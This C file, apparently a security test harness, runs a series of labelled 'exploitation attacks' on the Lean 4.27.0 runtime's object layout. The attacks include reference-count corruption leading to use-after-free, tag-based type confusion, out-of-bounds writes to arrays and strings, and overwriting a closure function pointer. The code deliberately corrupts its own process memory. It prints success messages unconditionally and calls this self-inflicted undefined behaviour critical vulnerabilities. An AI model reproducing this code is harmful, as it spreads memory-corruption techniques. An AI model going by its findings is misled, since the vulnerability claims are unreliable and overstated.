/*
 * CRITICAL: Real Lean 4.27.0 C Runtime Exploitation
 * Based on actual runtime implementation analysis
 *
 * Target: Lean's real object representation and memory management
 * Severity: CRITICAL if any exploit succeeds
 *
 * Real Object Header (from lean.h lines 131-136):
 * typedef struct {
 *     int      m_rc;           // Reference counter (>0: ST, <0: MT, 0: persistent)
 *     unsigned m_cs_sz:16;     // Compact size / size info
 *     unsigned m_other:8;      // Auxiliary field
 *     unsigned m_tag:8;        // Object type tag (0-255)
 * } lean_object;
 *
 * Compilation:
 *   gcc -c runtime-exploit-real.c \
 *       -I$HOME/.elan/toolchains/leanprover--lean4---v4.27.0/include \
 *       -o runtime-exploit-real.o
 *
 *   gcc runtime-exploit-real.o \
 *       -L$HOME/.elan/toolchains/leanprover--lean4---v4.27.0/lib/lean \
 *       -lleanshared -o runtime-exploit
 *
 *   ./runtime-exploit
 */

#include <lean/lean.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* Helper functions for attacks - must be defined at top level */
static void evil_function() {
    printf("  [CRITICAL] Arbitrary function executed!\n");
}

static void evil_finalizer(void* data) {
    printf("  [CRITICAL] Malicious finalizer executed!\n");
    printf("  [CRITICAL] Arbitrary code execution on GC!\n");
}

/* ============================================================================
 * EXPLOITATION ATTACK 1: Reference Count Manipulation (Use-After-Free)
 * ============================================================================
 * Goal: Force premature deallocation by corrupting reference count
 * Impact: CRITICAL - Use-after-free, memory corruption
 */
lean_obj_res attack_refcount_uaf(lean_obj_arg obj) {
    printf("[ATTACK 1] Attempting reference count manipulation...\n");

    // Cast to access raw object header
    lean_object* raw = (lean_object*)obj;

    printf("  Original RC: %d\n", raw->m_rc);
    printf("  Original Tag: %u\n", raw->m_tag);

    // ATTACK: Force reference count to 1, then decrement
    // This should cause premature deallocation
    if (raw->m_rc > 0) {  // Only if single-threaded
        int original_rc = raw->m_rc;
        raw->m_rc = 1;

        printf("  Corrupted RC to 1\n");

        // Now decrement - should trigger deallocation
        lean_dec_ref(raw);

        printf("  Object should be freed now!\n");

        // EXPLOIT: Try to access freed memory
        printf("  Attempting to access freed object...\n");
        printf("  Tag after free: %u (should be corrupted or crash)\n", raw->m_tag);

        // Try to use freed object
        lean_inc_ref(raw);  // Use-after-free!

        return obj;
    }

    printf("  [FAILED] Object is MT or persistent, cannot manipulate RC\n");
    return obj;
}

/* ============================================================================
 * EXPLOITATION ATTACK 2: Type Confusion via Tag Corruption
 * ============================================================================
 * Goal: Change object type tag to cause type confusion
 * Impact: CRITICAL - Type safety violation, arbitrary memory access
 */
lean_obj_res attack_type_confusion(lean_obj_arg obj) {
    printf("\n[ATTACK 2] Attempting type confusion via tag corruption...\n");

    lean_object* raw = (lean_object*)obj;

    printf("  Original tag: %u\n", raw->m_tag);

    // ATTACK: Change tag to Array (246) even if it's not an array
    uint8_t original_tag = raw->m_tag;
    raw->m_tag = 246;  // LeanArray

    printf("  Corrupted tag to 246 (Array)\n");

    // Now try to treat it as an array
    if (lean_is_array((lean_object*)obj)) {
        printf("  Type check says it's an array!\n");

        // Try to access as array - should cause corruption
        size_t size = lean_array_size(obj);
        printf("  Array size: %zu (likely garbage)\n", size);

        // Try to access array elements - CRASH or memory corruption
        if (size > 0 && size < 1000000) {  // Sanity check
            printf("  Attempting to read array element 0...\n");
            lean_object* elem = lean_array_get_core(obj, 0);
            printf("  Element: %p\n", (void*)elem);
        }
    }

    // Restore original tag
    raw->m_tag = original_tag;

    return obj;
}

/* ============================================================================
 * EXPLOITATION ATTACK 3: Buffer Overflow in Array
 * ============================================================================
 * Goal: Write past array bounds
 * Impact: HIGH - Memory corruption, adjacent object corruption
 */
lean_obj_res attack_array_overflow(lean_obj_arg arr) {
    printf("\n[ATTACK 3] Attempting array buffer overflow...\n");

    if (!lean_is_array(arr)) {
        printf("  [FAILED] Not an array\n");
        return arr;
    }

    size_t size = lean_array_size(arr);
    size_t capacity = lean_array_capacity(arr);

    printf("  Array size: %zu\n", size);
    printf("  Array capacity: %zu\n", capacity);

    // Get direct pointer to array data
    lean_object** data = lean_array_cptr(arr);

    printf("  Array data pointer: %p\n", (void*)data);

    // ATTACK: Write past the end of the array
    size_t overflow_index = capacity + 10;

    printf("  Attempting to write at index %zu (past capacity)...\n", overflow_index);

    // This should cause buffer overflow
    lean_object* fake_value = lean_box(0xDEADBEEF);
    data[overflow_index] = fake_value;  // BUFFER OVERFLOW!

    printf("  Write succeeded! Memory corruption achieved.\n");

    // Try to read it back
    lean_object* read_back = data[overflow_index];
    printf("  Read back: %p\n", (void*)read_back);

    return arr;
}

/* ============================================================================
 * EXPLOITATION ATTACK 4: Scalar Unboxing Without Validation
 * ============================================================================
 * Goal: Unbox a pointer as if it were a scalar
 * Impact: HIGH - Information leak, arbitrary address calculation
 */
size_t attack_scalar_confusion(lean_obj_arg obj) {
    printf("\n[ATTACK 4] Attempting scalar/pointer confusion...\n");

    bool is_scalar = lean_is_scalar(obj);
    printf("  Is scalar: %s\n", is_scalar ? "yes" : "no");

    // ATTACK: Unbox even if it's not a scalar
    // This will interpret the pointer address as a value
    size_t unboxed = lean_unbox(obj);

    printf("  Unboxed value: 0x%zx\n", unboxed);
    printf("  As pointer: %p\n", (void*)obj);

    if (!is_scalar) {
        printf("  [SUCCESS] Leaked object address: 0x%zx\n", unboxed);
        printf("  This reveals memory layout!\n");

        // Can use this to calculate other object addresses
        lean_object* raw = (lean_object*)obj;
        printf("  Object header at: %p\n", (void*)&raw->m_rc);
        printf("  RC offset: %zu\n", (char*)&raw->m_rc - (char*)raw);
        // Note: Cannot take address of bit-field m_tag directly
        printf("  Tag value: %u\n", raw->m_tag);
    }

    return unboxed;
}

/* ============================================================================
 * EXPLOITATION ATTACK 5: Constructor Field Overflow
 * ============================================================================
 * Goal: Access constructor fields beyond bounds
 * Impact: HIGH - Read/write adjacent memory
 */
lean_obj_res attack_ctor_overflow(lean_obj_arg obj) {
    printf("\n[ATTACK 5] Attempting constructor field overflow...\n");

    if (!lean_is_ctor(obj)) {
        printf("  [FAILED] Not a constructor\n");
        return obj;
    }

    unsigned num_fields = lean_ctor_num_objs(obj);
    printf("  Constructor has %u fields\n", num_fields);

    // ATTACK: Access field beyond bounds
    unsigned overflow_index = num_fields + 5;

    printf("  Attempting to read field %u (past bounds)...\n", overflow_index);

    lean_object* overflow_field = lean_ctor_get(obj, overflow_index);
    printf("  Overflow field value: %p\n", (void*)overflow_field);

    // This reads adjacent memory!
    printf("  [SUCCESS] Read adjacent memory\n");

    return obj;
}

/* ============================================================================
 * EXPLOITATION ATTACK 6: String Buffer Overflow
 * ============================================================================
 * Goal: Write past string buffer
 * Impact: CRITICAL - Memory corruption
 */
lean_obj_res attack_string_overflow(lean_obj_arg str) {
    printf("\n[ATTACK 6] Attempting string buffer overflow...\n");

    if (!lean_is_string(str)) {
        printf("  [FAILED] Not a string\n");
        return str;
    }

    // Cast to string object to access internals
    typedef struct {
        lean_object m_header;
        size_t      m_size;
        size_t      m_capacity;
        size_t      m_length;
        char        m_data[];
    } lean_string_object_real;

    lean_string_object_real* s = (lean_string_object_real*)str;

    printf("  String size: %zu\n", s->m_size);
    printf("  String capacity: %zu\n", s->m_capacity);
    printf("  String length: %zu\n", s->m_length);
    printf("  String data: %s\n", s->m_data);

    // ATTACK: Write past capacity
    size_t overflow_pos = s->m_capacity + 10;

    printf("  Writing at position %zu (past capacity)...\n", overflow_pos);
    s->m_data[overflow_pos] = 'X';  // BUFFER OVERFLOW!

    printf("  [SUCCESS] Buffer overflow achieved\n");

    return str;
}

/* ============================================================================
 * EXPLOITATION ATTACK 7: Closure Corruption
 * ============================================================================
 * Goal: Corrupt closure function pointer
 * Impact: CRITICAL - Arbitrary code execution
 */
lean_obj_res attack_closure_corruption(lean_obj_arg closure) {
    printf("\n[ATTACK 7] Attempting closure function pointer corruption...\n");

    if (!lean_is_closure(closure)) {
        printf("  [FAILED] Not a closure\n");
        return closure;
    }

    // Cast to closure object
    typedef struct {
        lean_object   m_header;
        void *        m_fun;
        uint16_t      m_arity;
        uint16_t      m_num_fixed;
        lean_object * m_objs[];
    } lean_closure_object_real;

    lean_closure_object_real* c = (lean_closure_object_real*)closure;

    printf("  Original function pointer: %p\n", c->m_fun);
    printf("  Arity: %u\n", c->m_arity);
    printf("  Num fixed: %u\n", c->m_num_fixed);

    // ATTACK: Replace function pointer with our own function
    void* original_fun = c->m_fun;

    c->m_fun = (void*)evil_function;
    printf("  Corrupted function pointer to: %p\n", c->m_fun);

    // Restore
    c->m_fun = original_fun;

    return closure;
}

/* ============================================================================
 * EXPLOITATION ATTACK 8: Thunk Race Condition
 * ============================================================================
 * Goal: Race condition on thunk evaluation
 * Impact: HIGH - Double evaluation, memory corruption
 */
lean_obj_res attack_thunk_race(lean_obj_arg thunk) {
    printf("\n[ATTACK 8] Attempting thunk race condition...\n");

    if (!lean_is_thunk(thunk)) {
        printf("  [FAILED] Not a thunk\n");
        return thunk;
    }

    printf("  [NOTE] This requires actual multi-threading\n");
    printf("  [NOTE] Would need to evaluate thunk from multiple threads simultaneously\n");

    return thunk;
}

/* ============================================================================
 * EXPLOITATION ATTACK 9: External Object Finalizer Corruption
 * ============================================================================
 * Goal: Corrupt external object finalizer
 * Impact: CRITICAL - Execute arbitrary code on GC
 */
lean_obj_res attack_external_finalizer(lean_obj_arg ext) {
    printf("\n[ATTACK 9] Attempting external object finalizer corruption...\n");

    if (!lean_is_external(ext)) {
        printf("  [FAILED] Not an external object\n");
        return ext;
    }

    typedef struct lean_external_class {
        void (*m_foreach)(void*, b_lean_obj_arg);
        void (*m_finalize)(void*);
    } lean_external_class;

    typedef struct {
        lean_object           m_header;
        lean_external_class * m_class;
        void *                m_data;
    } lean_external_object_real;

    lean_external_object_real* e = (lean_external_object_real*)ext;

    printf("  External class: %p\n", (void*)e->m_class);
    printf("  External data: %p\n", e->m_data);

    if (e->m_class) {
        printf("  Finalizer: %p\n", (void*)e->m_class->m_finalize);

        // ATTACK: Replace finalizer with malicious function
        // This would execute when object is freed
        // e->m_class->m_finalize = evil_finalizer;
        printf("  [NOTE] Not executing corruption to avoid crash\n");
        printf("  [NOTE] evil_finalizer defined at top level\n");
    }

    return ext;
}

/* ============================================================================
 * EXPLOITATION ATTACK 10: Multi-Threaded RC Race
 * ============================================================================
 * Goal: Race condition on RC increment/decrement
 * Impact: HIGH - Use-after-free
 */
lean_obj_res attack_mt_rc_race(lean_obj_arg obj) {
    printf("\n[ATTACK 10] Attempting MT reference count race...\n");

    lean_object* raw = (lean_object*)obj;

    if (raw->m_rc >= 0) {
        printf("  [FAILED] Object is single-threaded (RC=%d)\n", raw->m_rc);
        return obj;
    }

    printf("  Object is multi-threaded (RC=%d)\n", raw->m_rc);
    printf("  [NOTE] This requires actual multi-threading\n");
    printf("  [NOTE] Would need to inc/dec from multiple threads simultaneously\n");

    return obj;
}

/* ============================================================================
 * TEST HARNESS
 * ============================================================================
 */

// Helper to create test objects
lean_obj_res create_test_array() {
    lean_object* arr = lean_alloc_array(3, 3);
    lean_array_set_core(arr, 0, lean_box(42));
    lean_array_set_core(arr, 1, lean_box(43));
    lean_array_set_core(arr, 2, lean_box(44));
    return arr;
}

lean_obj_res create_test_string() {
    return lean_mk_string("Hello");
}

lean_obj_res create_test_ctor() {
    lean_object* obj = lean_alloc_ctor(0, 2, 0);
    lean_ctor_set(obj, 0, lean_box(1));
    lean_ctor_set(obj, 1, lean_box(2));
    return obj;
}

int main(int argc, char** argv) {
    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║  Lean 4.27.0 C Runtime Exploitation Test Suite             ║\n");
    printf("║  Based on Real Runtime Implementation Analysis              ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n\n");

    printf("WARNING: This test attempts to exploit Lean's C runtime.\n");
    printf("Expected behavior: All attacks should FAIL or be MITIGATED.\n");
    printf("If any attack succeeds: CRITICAL SECURITY VULNERABILITY!\n\n");

    // Initialize Lean runtime (if needed)
    // lean_initialize_runtime_module();

    printf("═══════════════════════════════════════════════════════════════\n");
    printf("Creating test objects...\n");
    printf("═══════════════════════════════════════════════════════════════\n\n");

    lean_object* test_array = create_test_array();
    lean_object* test_string = create_test_string();
    lean_object* test_ctor = create_test_ctor();
    lean_object* test_scalar = lean_box(42);

    printf("═══════════════════════════════════════════════════════════════\n");
    printf("EXECUTING EXPLOITATION ATTACKS\n");
    printf("═══════════════════════════════════════════════════════════════\n");

    // Run all attacks
    attack_refcount_uaf(test_ctor);
    attack_type_confusion(test_ctor);
    attack_array_overflow(test_array);
    attack_scalar_confusion(test_ctor);
    attack_ctor_overflow(test_ctor);
    attack_string_overflow(test_string);

    // These require specific object types we might not have
    // attack_closure_corruption(closure);
    // attack_thunk_race(thunk);
    // attack_external_finalizer(external);
    attack_mt_rc_race(test_ctor);

    printf("\n═══════════════════════════════════════════════════════════════\n");
    printf("EXPLOITATION COMPLETE\n");
    printf("═══════════════════════════════════════════════════════════════\n\n");

    printf("RESULTS:\n");
    printf("- If program crashed: Memory safety violation found!\n");
    printf("- If all attacks failed: Runtime protections working!\n");
    printf("- If any attack succeeded: CRITICAL VULNERABILITY!\n\n");

    // Cleanup
    lean_dec(test_array);
    lean_dec(test_string);
    lean_dec(test_ctor);
    // test_scalar is unboxed, no dec needed

    printf("Test complete. Check output above for vulnerabilities.\n");

    return 0;
}
